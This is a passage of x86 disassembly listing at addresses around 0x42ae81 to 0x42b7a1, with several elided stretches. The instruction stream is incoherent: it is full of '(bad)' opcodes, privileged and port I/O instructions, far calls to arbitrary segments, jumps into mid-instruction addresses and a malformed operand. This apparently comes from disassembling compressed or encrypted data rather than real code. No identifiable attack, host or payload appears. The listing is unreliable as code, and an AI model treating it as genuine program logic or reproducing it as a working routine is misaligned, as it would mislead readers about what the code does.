  42ae81:	imul   ebx,DWORD PTR [esi-0xca80cb4],0xffffffa9
  42ae88:	fiadd  DWORD PTR [eax]
  42ae8a:	jns    0x42ae0f
  42ae8c:	inc    edi
  42ae8d:	cld    
  42ae8e:	mov    bh,0xb2
  42ae90:	ret    
  42ae91:	int3   
  42ae92:	aam    0x44
  42ae94:	ins    BYTE PTR es:[edi],dx
  42ae95:	fucomp st(3)
  42ae97:	les    ebp,FWORD PTR [ebx+0x3b]
  42ae9a:	test   eax,0x2258f87
  42ae9f:	mov    al,ds:0xd3f93377
  42aea4:	mov    ah,0xa0
  42aea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aea7:	test   eax,0xac321543
  42aeac:	jle    0x42ae76
  42aeae:	ret    0x915a
  42aeb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aeb2:	gs sbb eax,0xcb8deb8e
  42aeb8:	mov    al,0xb4
  42aeba:	xor    eax,0xb12a698e
  42aebf:	ror    DWORD PTR [eax],0xbe
  42aec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aec3:	and    bh,0xd5
  42aec6:	je     0x42aec5
  42aec8:	pop    DWORD PTR [esi]
  42aeca:	dec    edi
  42aecb:	mov    edi,0x52a1434b
  42aed0:	aaa    
  42aed1:	and    BYTE PTR [ebp+0x7],bl
  42aed4:	es aaa 
  42aed6:	dec    edi
  42aed7:	jne    0x42ae5d
  42aed9:	push   ebp
  42aeda:	dec    edx
  42aedb:	pop    ebx
  42aedc:	(bad)  
  42aedd:	xchg   esp,eax
  42aede:	mov    ebx,0xb09a19da
  42aee3:	iret   
  42aee4:	push   cs
  42aee5:	xor    DWORD PTR [edi+0x6f9e7cf3],ecx
  42aeeb:	cmp    al,0x91
  42aeed:	xor    ah,BYTE PTR [edx-0x4b]
  42aef0:	div    DWORD PTR [edi-0x5a]
  42aef3:	stos   BYTE PTR es:[edi],al
  42aef4:	enter  0xd586,0x29
  42aef8:	mov    ds:0x4c0e12b,eax
  42aefd:	scas   al,BYTE PTR es:[edi]
  42aefe:	pop    edx
  42aeff:	data16 jnp 0x42ae97
  42af02:	call   0x7f65:0x36b41749
  42af09:	inc    esi
  42af0a:	iret   
  42af0b:	push   edi
  42af0c:	mov    dh,0x61
  42af0e:	rcr    DWORD PTR [eax-0x5a],0xc6
  42af12:	cmp    dl,cl
  42af14:	push   ecx
  42af15:	sbb    ebx,eax
  42af17:	pop    ss
  42af18:	xchg   ebx,eax
  42af19:	fwait
  42af1a:	sub    ecx,DWORD PTR [ebx+0x25]
  42af1d:	in     eax,0x50
  42af1f:	imul   esp,DWORD PTR [esi+0x37],0x74
  42af23:	aam    0x9c
  42af25:	jnp    0x42aebe
  42af27:	pop    ebp
  42af28:	stc    
  42af29:	mov    ds:0xf8292981,al
  42af2e:	ror    DWORD PTR [esi],0x8b
  42af31:	mov    ebp,0xbd7a49
	...
  42af96:	stc    
  42af97:	enter  0xdc7a,0x7b
  42af9b:	(bad)  
  42af9c:	(bad)  
  42af9d:	in     eax,dx
  42af9e:	(bad)  
  42af9f:	adc    DWORD PTR [ebp-0x7e669d16],0xfffffffb
  42afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afa7:	retf   
  42afa8:	add    DWORD PTR [eax],eax
  42afaa:	pop    es
  42afab:	add    DWORD PTR [eax],eax
  42afad:	add    BYTE PTR [ecx-0x7a],ch
  42afb0:	add    ch,BYTE PTR [eax]
  42afb2:	xchg   DWORD PTR [edi],edi
  42afb4:	arpl   si,si
  42afb6:	out    dx,al
  42afb7:	jmp    0x42afd7
  42afb9:	in     al,dx
  42afba:	and    DWORD PTR [eax+0x2e],ebx
  42afbd:	lods   eax,DWORD PTR ds:[esi]
  42afbe:	mov    eax,ds:0x27fa5c99
  42afc3:	pop    es
  42afc4:	scas   eax,DWORD PTR es:[edi]
  42afc5:	xchg   DWORD PTR [ecx],ebp
  42afc7:	push   es
  42afc8:	scas   al,BYTE PTR es:[edi]
  42afc9:	(bad)  
  42afca:	push   0x72a4632c
  42afcf:	jecxz  0x42b039
  42afd1:	add    eax,0x7c937ab2
  42afd6:	mov    ebx,edx
  42afd8:	jb     0x42afe2
  42afda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42afdb:	xor    DWORD PTR [esi+0x6f],esp
  42afde:	lea    esp,[ebx+0x68a81766]
  42afe4:	mov    dh,0x28
  42afe6:	pop    ds
  42afe7:	push   ecx
  42afe8:	push   esi
  42afe9:	pop    ebp
  42afea:	dec    ecx
  42afeb:	push   ss
  42afec:	cs retf 
  42afee:	xlat   BYTE PTR ds:[ebx]
  42afef:	pop    es
  42aff0:	clc    
  42aff1:	push   es
  42aff2:	inc    esi
  42aff3:	retf   
  42aff4:	inc    esp
  42aff5:	mov    bl,0x4e
  42aff7:	or     DWORD PTR [edi+ecx*2],esi
  42affa:	mov    esp,0xb6c5afbc
  42afff:	push   ds
  42b000:	ret    0xb7b1
  42b003:	(bad)  
  42b004:	les    ebp,FWORD PTR [esi+0x625b5960]
  42b00a:	and    bl,ch
  42b00c:	dec    ecx
  42b00d:	es out dx,eax
  42b00f:	dec    edx
  42b010:	bound  edi,QWORD PTR [edi]
  42b012:	pop    edx
  42b013:	or     al,0xaf
  42b015:	and    DWORD PTR [ebx+0x5e6dec99],edi
  42b01b:	mov    bl,BYTE PTR [esi+0x15]
  42b01e:	adc    eax,0x4724a35e
  42b023:	mov    al,0x51
  42b025:	rol    DWORD PTR [edx+eiz*8+0x47],1
  42b029:	mov    edi,0xa728cc5c
  42b02e:	dec    esi
  42b02f:	ja     0x42b0ac
  42b031:	fisub  WORD PTR [eax]
  42b033:	xor    bh,cl
  42b035:	test   DWORD PTR [esi],ecx
  42b037:	sub    ah,bl
  42b039:	push   cs
  42b03a:	mov    ah,0xdb
  42b03c:	lds    eax,FWORD PTR [ebx-0x7b2cbd43]
  42b042:	addr16 jno 0x42b08a
  42b045:	xor    BYTE PTR [ebp-0x1b],cl
  42b048:	mov    dl,0x1a
  42b04a:	lods   eax,DWORD PTR ds:[esi]
  42b04b:	icebp  
  42b04c:	aad    0x3e
  42b04e:	sub    bh,BYTE PTR ds:0xcfad9513
  42b054:	mov    ecx,0x9d60b871
  42b059:	xor    DWORD PTR [ecx],edx
  42b05b:	xchg   esp,eax
  42b05c:	loopne 0x42b06a
  42b05e:	pop    ecx
  42b05f:	aas    
  42b060:	pop    edx
  42b061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b062:	repz mov esi,0xa179b467
  42b068:	sub    BYTE PTR [ebx],dh
  42b06a:	inc    eax
  42b06b:	into   
  42b06c:	jmp    FWORD PTR [eax]
  42b06e:	(bad)  
  42b06f:	call   0x2a9390ad
  42b074:	gs xchg ecx,eax
  42b076:	mov    eax,0x311033be
  42b07b:	push   ecx
  42b07c:	sub    ecx,ebp
  42b07e:	sbb    DWORD PTR [eax+edx*4-0x47],ecx
  42b082:	in     eax,0x29
  42b084:	sbb    DWORD PTR [ebx],ebp
  42b086:	stc    
  42b087:	dec    edi
  42b088:	and    ch,0xcb
  42b08b:	or     cl,dh
  42b08d:	adc    DWORD PTR [edx-0x55a037ae],eax
  42b093:	jb     0x42b0a6
  42b095:	sar    BYTE PTR [edx],0xdf
  42b098:	jne    0x42b10e
  42b09a:	cmp    eax,0xc2d120b6
  42b09f:	jge    0x42b113
  42b0a1:	mov    al,ds:0x52089d6d
  42b0a6:	pop    esi
  42b0a7:	cmc    
  42b0a8:	jb     0x42b062
  42b0aa:	and    edi,DWORD PTR [edi+edi*4-0x4907d436]
  42b0b1:	inc    cl
  42b0b3:	jns    0x42b0ff
	...
  42b115:	add    BYTE PTR [ebp+0x25],dh
  42b118:	imul   ebx,DWORD PTR [edi-0x51]
  42b11c:	cmc    
  42b11d:	(bad)  
  42b11e:	dec    DWORD PTR [edi+0x49b680ad]
  42b124:	push   esp
  42b125:	test   DWORD PTR [esi+0x70001cc],ebp
  42b12b:	add    DWORD PTR [eax],eax
  42b12d:	add    BYTE PTR [ebx],ah
  42b12f:	inc    DWORD PTR [edx+0x555ca902]
  42b135:	mov    esi,DWORD PTR ds:0xf18359c1
  42b13b:	inc    edx
  42b13c:	fwait
  42b13d:	jnp    0x42b175
  42b13f:	lahf   
  42b140:	out    dx,eax
  42b141:	sbb    bl,al
  42b143:	mov    eax,DWORD PTR [ebp+ecx*4-0x3a65d72e]
  42b14a:	inc    edx
  42b14b:	mov    al,0xfe
  42b14d:	test   BYTE PTR [edx],ah
  42b14f:	sub    ah,BYTE PTR [ebx+0x7b8079a1]
  42b155:	cmp    DWORD PTR [esp+edi*1],edx
  42b158:	or     al,0x38
  42b15a:	ror    ecx,1
  42b15c:	pop    ds
  42b15d:	out    0xf9,eax
  42b15f:	mov    al,0x34
  42b161:	mov    ?,WORD PTR [eax+0x1d]
  42b164:	jne    0x42b1e3
  42b166:	inc    ebx
  42b167:	adc    bl,BYTE PTR [edx+0x6a]
  42b16a:	(bad)  
  42b16b:	sti    
  42b16c:	test   al,0xbb
  42b16e:	adc    BYTE PTR [esi-0x60df5041],bh
  42b174:	inc    ecx
  42b175:	xchg   esp,eax
  42b176:	das    
  42b177:	xor    bh,BYTE PTR [edx-0x16c0d5c]
  42b17d:	idiv   BYTE PTR [ebp-0x454abc27]
  42b183:	outs   dx,DWORD PTR ds:[esi]
  42b184:	lahf   
  42b185:	test   al,0x98
  42b187:	dec    ebp
  42b188:	cmp    ah,cl
  42b18a:	adc    al,0x82
  42b18c:	sbb    ebp,DWORD PTR [esi]
  42b18e:	ds scas al,BYTE PTR es:[edi]
  42b190:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b191:	ret    
  42b192:	aaa    
  42b193:	jl     0x42b213
  42b195:	or     eax,0xdaadd85
  42b19a:	stos   DWORD PTR es:[edi],eax
  42b19b:	(bad)  
  42b19c:	aam    0xd3
  42b19e:	jnp    0x42b1df
  42b1a0:	outs   dx,BYTE PTR ds:[esi]
  42b1a1:	mov    bl,0x5a
  42b1a3:	inc    dx
  42b1a5:	in     al,dx
  42b1a6:	fs push cs
  42b1a8:	xor    BYTE PTR [ebx-0x5d],ah
  42b1ab:	ss pop esp
  42b1ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1ae:	mov    es,esp
  42b1b0:	repz retf 0xb52c
  42b1b4:	jbe    0x42b160
  42b1b6:	stc    
  42b1b7:	mov    ch,0x35
  42b1b9:	inc    edx
  42b1ba:	push   edx
  42b1bb:	jmp    0x42b1e3
  42b1bd:	cmp    eax,0x5cf608b3
  42b1c2:	or     al,0x7d
  42b1c4:	test   DWORD PTR [edx+eax*2],ebp
  42b1c7:	call   0x4e44:0x6df0644a
  42b1ce:	cmp    edi,DWORD PTR [eax-0x4]
  42b1d1:	shr    DWORD PTR [ecx],1
  42b1d3:	rep ins DWORD PTR es:[edi],dx
  42b1d5:	xchg   esp,eax
  42b1d6:	add    al,0xba
  42b1d8:	push   ebp
  42b1d9:	std    
  42b1da:	hlt    
  42b1db:	arpl   WORD PTR [edi],ax
  42b1dd:	in     al,0x68
  42b1df:	sbb    DWORD PTR [edi],esi
  42b1e1:	pop    esi
  42b1e2:	mov    edi,0x5e51e937
  42b1e7:	inc    ecx
  42b1e8:	push   esi
  42b1e9:	aam    0xf3
  42b1eb:	mov    ds:0x1e15b4c4,eax
  42b1f0:	fmulp  st(1),st
  42b1f2:	inc    esp
  42b1f3:	ss scas eax,DWORD PTR es:[edi]
  42b1f5:	loope  0x42b251
  42b1f7:	jp     0x42b1e1
  42b1f9:	je     0x42b228
  42b1fb:	sbb    al,0xf4
  42b1fd:	repnz xchg esi,eax
  42b1ff:	pop    esi
  42b200:	mov    bl,0xde
  42b202:	leave  
  42b203:	or     eax,0x21b252cd
  42b208:	inc    esp
  42b209:	pop    ebx
  42b20a:	scas   al,BYTE PTR es:[edi]
  42b20b:	add    eax,0xdc95eec0
  42b210:	inc    esp
  42b211:	hlt    
  42b212:	es cmp eax,0xa06edf95
  42b218:	sahf   
  42b219:	adc    cl,BYTE PTR [edi-0x3835a1d8]
  42b21f:	xor    DWORD PTR [esi+0x22],ecx
  42b222:	jnp    0x42b1ad
  42b224:	std    
  42b225:	add    BYTE PTR [edx-0x3e],dl
  42b228:	mov    dl,0x9b
  42b22a:	ins    DWORD PTR es:[edi],dx
  42b22b:	scas   al,BYTE PTR es:[edi]
  42b22c:	rcl    DWORD PTR [esp+ebp*1-0x4e],1
  42b230:	mov    ah,0xcd
  42b232:	jecxz  0x42b29b
  42b234:	in     eax,0x0
	...
  42b296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b297:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b29d:	iret   
  42b29e:	arpl   dx,si
  42b2a0:	or     BYTE PTR [ebp+0x3],ch
  42b2a3:	aaa    
  42b2a4:	push   esp
  42b2a5:	sub    esi,DWORD PTR [ebp+0x70001cd]
  42b2ab:	add    DWORD PTR [eax],eax
  42b2ad:	add    BYTE PTR [esp+eax*8+0x2fc6e6b4],al
  42b2b4:	xor    eax,DWORD PTR ds:0xca126d87
  42b2ba:	add    al,0x51
  42b2bc:	and    DWORD PTR [ebp-0x39],ebx
  42b2bf:	push   esp
  42b2c0:	gs mov ah,0x8b
  42b2c3:	pop    eax
  42b2c4:	in     al,0x77
  42b2c6:	push   eax
  42b2c7:	jl     0x42b2ec
  42b2c9:	lock jge 0x42b33e
  42b2cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2cd:	scas   eax,DWORD PTR es:[edi]
  42b2ce:	stos   DWORD PTR es:[edi],eax
  42b2cf:	cmp    dl,0x6b
  42b2d2:	xor    ch,BYTE PTR [esi+0x567db3f4]
  42b2d8:	out    0x3b,eax
  42b2da:	jle    0x42b341
  42b2dc:	sahf   
  42b2dd:	cli    
  42b2de:	ret    0xf73
  42b2e1:	pop    edi
  42b2e2:	push   ebx
  42b2e3:	jmp    0xad3012d0
  42b2e8:	push   edx
  42b2e9:	cdq    
  42b2ea:	lds    ebp,FWORD PTR [ecx]
  42b2ec:	mul    DWORD PTR [ecx]
  42b2ee:	push   0x75
  42b2f0:	(bad)  [esi-0x4]
  42b2f3:	sub    al,al
  42b2f5:	pop    eax
  42b2f6:	fstp   DWORD PTR [edi-0x575f86b9]
  42b2fc:	iret   
  42b2fd:	jge    0x42b370
  42b2ff:	xchg   edx,eax
  42b300:	stos   BYTE PTR es:[edi],al
  42b301:	or     DWORD PTR [edx-0x2b],ecx
  42b304:	cmp    eax,0x70e6ccb2
  42b309:	in     al,dx
  42b30a:	pop    ds
  42b30b:	lds    edx,FWORD PTR [esi+0x721f5bc1]
  42b311:	rol    BYTE PTR [ebx],1
  42b313:	scas   al,BYTE PTR es:[edi]
  42b314:	cmp    edx,DWORD PTR [esi-0x43bdf263]
  42b31a:	dec    ebp
  42b31b:	sub    eax,DWORD PTR [eax+0x3819d56c]
  42b321:	fwait
  42b322:	xor    DWORD PTR [ebx+0x71191015],0xab6430cc
  42b32c:	scas   eax,DWORD PTR es:[edi]
  42b32d:	leave  
  42b32e:	inc    ebp
  42b32f:	cmp    eax,DWORD PTR [ebp-0x2adca2d5]
  42b335:	ja     0x42b2d5
  42b337:	add    dh,bh
  42b339:	fst    DWORD PTR [esi]
  42b33b:	mov    cl,0x5c
  42b33d:	je     0x42b380
  42b33f:	push   ecx
  42b340:	xor    DWORD PTR [ebx-0x6737bf71],0x27
  42b347:	adc    DWORD PTR [eax],esp
  42b349:	call   0x8b40d651
  42b34e:	fst    DWORD PTR [edi-0x73]
  42b351:	jns    0x42b36c
  42b353:	(bad)  
  42b355:	inc    ebx
  42b356:	cmp    bl,BYTE PTR [ebx-0x15]
  42b359:	call   0x2733:0xdf0767ad
  42b360:	xchg   ebx,eax
  42b361:	cmp    BYTE PTR [edx-0x40],ah
  42b364:	out    0xaa,al
  42b366:	adc    bl,BYTE PTR [ecx-0x2eae57de]
  42b36c:	add    DWORD PTR [ecx],ecx
  42b36e:	(bad)  
  42b36f:	push   eax
  42b370:	cdq    
  42b371:	ficom  WORD PTR [esi]
  42b373:	pop    edx
  42b374:	mov    ds:0x5bf2ea75,al
  42b379:	mov    ebp,0xd8379e1a
  42b37e:	(bad)  
  42b380:	lods   eax,DWORD PTR ds:[esi]
  42b381:	jne    0x42b3d6
  42b383:	fidivr DWORD PTR [esi+0x4b2087cf]
  42b389:	sub    ecx,DWORD PTR [eax]
  42b38b:	out    0x2e,eax
  42b38d:	pop    ss
  42b38e:	and    BYTE PTR [ecx],dl
  42b390:	xchg   esi,eax
  42b391:	retf   
  42b392:	dec    eax
  42b393:	out    dx,al
  42b394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b395:	jl     0x42b398
  42b397:	adc    DWORD PTR [ecx+edx*4+0x5d],0x1b
  42b39c:	lock fcmovnbe st,st(0)
  42b39f:	dec    esi
  42b3a0:	aad    0x12
  42b3a2:	xlat   BYTE PTR ds:[ebx]
  42b3a3:	(bad)  
  42b3a4:	pop    esi
  42b3a5:	lods   eax,DWORD PTR ds:[esi]
  42b3a6:	push   ss
  42b3a7:	xor    edi,DWORD PTR [ebx+0x44428cb8]
  42b3ad:	jns    0x42b395
  42b3af:	dec    esp
  42b3b0:	pop    es
  42b3b1:	sub    BYTE PTR [edi+0x6972],ah
	...
  42b413:	add    BYTE PTR [eax],al
  42b415:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b41b:	out    dx,eax
  42b41c:	into   
  42b41d:	shl    BYTE PTR gs:[esp+esi*8+0x42],0x48
  42b423:	or     eax,0xcebc13f2
  42b428:	add    DWORD PTR [eax],eax
  42b42a:	pop    es
  42b42b:	add    DWORD PTR [eax],eax
  42b42d:	add    BYTE PTR [edx+edx*4],cl
  42b430:	test   al,0x7f
  42b432:	out    0x3b,eax
  42b434:	adc    eax,0xfc74e839
  42b439:	mov    edx,0x540b940a
  42b43e:	vminsd xmm1,xmm1,QWORD PTR [bx+di+0x63]
  42b444:	enter  0xf64e,0xe5
  42b448:	stc    
  42b449:	in     al,0x8e
  42b44b:	cdq    
  42b44c:	mov    BYTE PTR ds:0x5d66f584,0x7
  42b453:	ret    0x7c51
  42b456:	inc    ecx
  42b457:	leave  
  42b458:	pop    ecx
  42b459:	mov    al,al
  42b45b:	dec    edi
  42b45c:	mov    esi,0xcbe7d37
  42b461:	neg    DWORD PTR [esi]
  42b463:	jb     0x42b46a
  42b465:	push   edi
  42b466:	push   esp
  42b467:	int3   
  42b468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b469:	inc    ebp
  42b46a:	daa    
  42b46b:	adc    DWORD PTR [edi+0x1b],esi
  42b46e:	jo     0x42b499
  42b470:	sbb    DWORD PTR [ebx],eax
  42b472:	pop    ebx
  42b473:	mov    bh,0xd9
  42b475:	fld    TBYTE PTR [ecx+0x2d]
  42b478:	lods   al,BYTE PTR ds:[esi]
  42b479:	mov    bl,0x4f
  42b47b:	fst    DWORD PTR [edi+0x29]
  42b47e:	fmul   st,st(2)
  42b480:	fcom   QWORD PTR [ebp+0xe]
  42b483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b484:	(bad)  
  42b485:	popa   
  42b486:	prefetchnta BYTE PTR [esi-0x18]
  42b48a:	xchg   ecx,ecx
  42b48c:	pop    edx
  42b48d:	test   al,0x9c
  42b48f:	je     0x42b4f0
  42b491:	out    0xa7,al
  42b493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b494:	inc    ebx
  42b495:	loope  0x42b485
  42b497:	pop    esp
  42b498:	fwait
  42b499:	loop   0x42b429
  42b49b:	aas    
  42b49c:	lock add ah,bl
  42b49f:	adc    dl,dl
  42b4a1:	jmp    0x8d452553
  42b4a6:	push   ds
  42b4a7:	hlt    
  42b4a8:	add    BYTE PTR [eax],cl
  42b4aa:	jo     0x42b4d1
  42b4ac:	jge    0x42b4a3
  42b4ae:	ins    BYTE PTR es:[edi],dx
  42b4af:	ins    BYTE PTR es:[edi],dx
  42b4b0:	push   eax
  42b4b1:	jae    0x42b52d
  42b4b3:	aad    0x6b
  42b4b5:	xor    eax,ebx
  42b4b7:	test   eax,0x6368d1e0
  42b4bc:	les    ebp,FWORD PTR [eax+0x315ebaa1]
  42b4c2:	addr16 pushf 
  42b4c4:	fwait
  42b4c5:	(bad)  
  42b4c6:	fmul   DWORD PTR [edi]
  42b4c8:	inc    ebp
  42b4c9:	retf   0x29bd
  42b4cc:	clc    
  42b4cd:	test   ebp,edx
  42b4cf:	aad    0x99
  42b4d1:	out    0xa7,al
  42b4d3:	inc    esp
  42b4d4:	mov    cl,0xf0
  42b4d6:	jmp    0x64fc:0x5434d3e3
  42b4dd:	adc    DWORD PTR [ecx+0x2dc762c9],esi
  42b4e3:	mov    ds:0xa226aeab,al
  42b4e8:	xchg   ecx,eax
  42b4e9:	js     0x42b551
  42b4eb:	mov    ebp,0x67f8658c
  42b4f0:	mov    ch,0xe0
  42b4f2:	pop    edx
  42b4f3:	push   esi
  42b4f4:	fs stc 
  42b4f6:	pusha  
  42b4f7:	dec    ebp
  42b4f8:	mov    eax,DWORD PTR [eax-0x35]
  42b4fb:	popf   
  42b4fc:	mov    dh,0x2b
  42b4fe:	jb     0x42b4df
  42b500:	inc    ebp
  42b501:	int3   
  42b502:	out    dx,eax
  42b503:	cmp    eax,0x9f411089
  42b509:	in     eax,0xbc
  42b50b:	push   es
  42b50c:	aam    0x5e
  42b50e:	mov    dl,0x2e
  42b510:	dec    edi
  42b511:	sbb    al,0x8c
  42b513:	sub    bl,dh
  42b515:	lods   eax,DWORD PTR ds:[esi]
  42b516:	sti    
  42b517:	cwde   
  42b518:	inc    ebx
  42b519:	mov    esi,0x36c1659a
  42b51e:	imul   edi,esp,0xc
  42b521:	shl    BYTE PTR [esi],0x59
  42b524:	jns    0x42b524
  42b526:	mov    DWORD PTR [ebp-0x4044c2ed],esp
  42b52c:	inc    esi
  42b52d:	mov    cl,0x17
  42b52f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b530:	pop    ebx
  42b531:	cmc    
  42b532:	mov    bh,0x63
  42b534:	sub    BYTE PTR [eax],al
	...
  42b596:	loopne 0x42b52c
  42b598:	and    bh,cl
  42b59a:	je     0x42b59b
  42b59c:	out    dx,eax
  42b59d:	mov    edi,0xcf8f6ca5
  42b5a2:	pop    ebx
  42b5a3:	ret    
  42b5a4:	sub    al,0x92
  42b5a6:	ret    
  42b5a7:	iret   
  42b5a8:	add    DWORD PTR [eax],eax
  42b5aa:	pop    es
  42b5ab:	add    DWORD PTR [eax],eax
  42b5ad:	add    BYTE PTR ds:0xaaddb46f,al
  42b5b3:	mov    ah,0x8
  42b5b5:	call   0x52d5:0xa39d606
  42b5bc:	outs   dx,DWORD PTR ds:[esi]
  42b5bd:	adc    al,0x45
  42b5bf:	enter  0x3610,0xd3
  42b5c3:	mov    ah,0xa3
  42b5c5:	mov    DWORD PTR [eax-0x59],esp
  42b5c8:	clc    
  42b5c9:	ror    DWORD PTR [eax+0x61],0xce
  42b5cd:	jb     0x42b5af
  42b5cf:	xor    eax,DWORD PTR [edi]
  42b5d1:	jbe    0x42b5b8
  42b5d3:	add    bh,BYTE PTR [ebp+0xd]
  42b5d6:	pop    edx
  42b5d7:	ss sahf 
  42b5d9:	mov    BYTE PTR [esi-0x6717ff2e],ah
  42b5df:	fmul   st(6),st
  42b5e1:	lea    ecx,[esi+eax*8+0x5c446248]
  42b5e8:	retf   
  42b5e9:	xchg   ebp,eax
  42b5ea:	loope  0x42b620
  42b5ec:	xchg   esp,eax
  42b5ed:	arpl   WORD PTR [ebx],di
  42b5ef:	(bad)  
  42b5f0:	and    eax,DWORD PTR [ecx]
  42b5f2:	lds    ebx,FWORD PTR [edx+eiz*1-0x3c9addba]
  42b5f9:	push   eax
  42b5fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b5fb:	mov    eax,ds:0xbb6ed51a
  42b600:	xor    BYTE PTR [ebx+edi*1-0x49],ah
  42b604:	scas   eax,DWORD PTR es:[edi]
  42b605:	fistp  QWORD PTR [edx+0x3]
  42b608:	dec    ebx
  42b609:	std    
  42b60a:	lahf   
  42b60b:	frstor [edx]
  42b60d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b60e:	pop    edi
  42b60f:	(bad)  
  42b610:	rol    BYTE PTR [ebx-0x6f58e6b8],1
  42b616:	push   ecx
  42b617:	pop    esp
  42b618:	push   0xffffff93
  42b61a:	xchg   ebx,eax
  42b61b:	loop   0x42b673
  42b61d:	push   eax
  42b61e:	dec    ecx
  42b61f:	xchg   ebx,eax
  42b620:	les    ebp,FWORD PTR [esi-0x10]
  42b623:	push   ecx
  42b624:	mov    al,0x1a
  42b626:	jne    0x42b673
  42b628:	push   ebx
  42b629:	test   DWORD PTR [edx+0x1b],eax
  42b62c:	shl    bl,1
  42b62e:	mov    edx,0xb478861b
  42b633:	out    dx,al
  42b634:	(bad)  
  42b635:	jmp    0x42b645
  42b637:	inc    edi
  42b638:	hlt    
  42b639:	pop    edx
  42b63a:	or     DWORD PTR [eax],ecx
  42b63c:	ret    
  42b63d:	iret   
  42b63e:	or     cl,ah
  42b640:	sbb    eax,0xfba6c15b
  42b645:	add    al,0x84
  42b647:	mov    al,0xa5
  42b649:	stos   DWORD PTR es:[edi],eax
  42b64a:	loopne 0x42b604
  42b64c:	lock fsub DWORD PTR [ebx+0x17]
  42b650:	call   0x62551747
  42b655:	(bad)  
  42b657:	mov    ebp,DWORD PTR [esi-0x39]
  42b65a:	popa   
  42b65b:	mov    al,BYTE PTR [ebx+edx*4+0x59932453]
  42b662:	pop    esi
  42b663:	(bad)  
  42b664:	push   edi
  42b665:	cli    
  42b666:	mov    ah,dh
  42b668:	pop    esi
  42b669:	je     0x42b69a
  42b66b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b66c:	pusha  
  42b66d:	mov    eax,0x57347956
  42b672:	xchg   BYTE PTR [ecx+0x2f0f8e13],ah
  42b678:	mov    ebp,0xeca6123d
  42b67d:	pop    es
  42b67e:	adc    eax,0xe095b5e5
  42b683:	in     al,0xa8
  42b685:	add    DWORD PTR [edi+eax*2],ebx
  42b688:	ins    DWORD PTR es:[edi],dx
  42b689:	int3   
  42b68a:	sbb    eax,0xd303df94
  42b68f:	adc    BYTE PTR [eax-0x3e],al
  42b692:	push   edx
  42b693:	(bad)  
  42b694:	mov    edi,0x6f069b0c
  42b699:	pop    ebx
  42b69a:	mov    ebp,0x2820fe41
  42b69f:	jp     0x42b71f
  42b6a1:	pextrw esi,(bad),0xc5
  42b6a3:	mov    dl,0x20
  42b6a5:	or     cl,BYTE PTR [ebx]
  42b6a7:	mov    ds,WORD PTR [esi-0x51]
  42b6aa:	sub    DWORD PTR [esi+0x5],ebx
  42b6ad:	fwait
  42b6ae:	mov    DWORD PTR [edi],ecx
  42b6b0:	push   ebx
  42b6b1:	cwde   
  42b6b2:	xchg   ebp,eax
  42b6b3:	icebp  
  42b6b4:	outs   dx,DWORD PTR ds:[esi]
	...
  42b715:	add    BYTE PTR [esi+0x42],cl
  42b718:	dec    ecx
  42b719:	daa    
  42b71a:	dec    ebp
  42b71b:	das    
  42b71c:	outs   dx,BYTE PTR ds:[esi]
  42b71d:	imul   eax,DWORD PTR [ebx],0xffffffcd
  42b720:	sub    BYTE PTR [ebp-0x55],bl
  42b723:	pusha  
  42b724:	mul    DWORD PTR [eax-0x36]
  42b727:	rol    BYTE PTR [ecx],1
  42b729:	add    BYTE PTR [edi],al
  42b72b:	add    DWORD PTR [eax],eax
  42b72d:	add    BYTE PTR [eax],dl
  42b72f:	cmp    bl,BYTE PTR [esi+0x1f]
  42b732:	dec    BYTE PTR [eax-0x2e]
  42b735:	mov    dl,0x3f
  42b737:	imul   ebx,edx,0x26135911
  42b73d:	xchg   ecx,eax
  42b73e:	ins    BYTE PTR es:[edi],dx
  42b73f:	pop    ebx
  42b740:	mov    ch,al
  42b742:	jne    0x42b7b6
  42b744:	int3   
  42b745:	int    0x42
  42b747:	dec    edi
  42b748:	(bad)  
  42b749:	sti    
  42b74a:	adc    edi,DWORD PTR [edx+0x45955a5e]
  42b750:	sbb    BYTE PTR [eax+esi*4],0xbe
  42b754:	lds    esp,FWORD PTR [eax-0x3e]
  42b757:	dec    ecx
  42b758:	ja     0x404ec6e5
  42b75e:	jno    0x42b75e
  42b760:	mov    al,ds:0x50d89b10
  42b765:	sub    DWORD PTR [edx],esi
  42b767:	stos   BYTE PTR es:[edi],al
  42b768:	pop    edx
  42b769:	aad    0xe
  42b76b:	push   ebp
  42b76c:	or     al,0x91
  42b76e:	xchg   ecx,eax
  42b76f:	lds    eax,FWORD PTR [esi]
  42b771:	sub    esi,eax
  42b773:	std    
  42b774:	repnz outs dx,DWORD PTR ds:[esi]
  42b776:	push   0x7f78032d
  42b77b:	lahf   
  42b77c:	add    dh,BYTE PTR [esi+eiz*4+0x1d]
  42b780:	cmc    
  42b781:	pop    esi
  42b782:	xchg   edx,eax
  42b783:	xchg   esp,eax
  42b784:	lds    esi,FWORD PTR [eax+eiz*4+0x387de7fd]
  42b78b:	pushf  
  42b78c:	imul   ecx,edx,0xffffff80
  42b78f:	outs   dx,DWORD PTR ds:[esi]
  42b790:	pop    ds
  42b791:	mov    edi,0xd0fa48a5
  42b796:	dec    edi
  42b797:	inc    ebp
  42b798:	mov    dh,0x48
  42b79a:	mov    eax,0x7cf5becb
  42b79f:	and    DWORD PTR [ebx],ebx
  42b7a1:	xor    DWORD PTR [edx-0x71],0x17ac7062
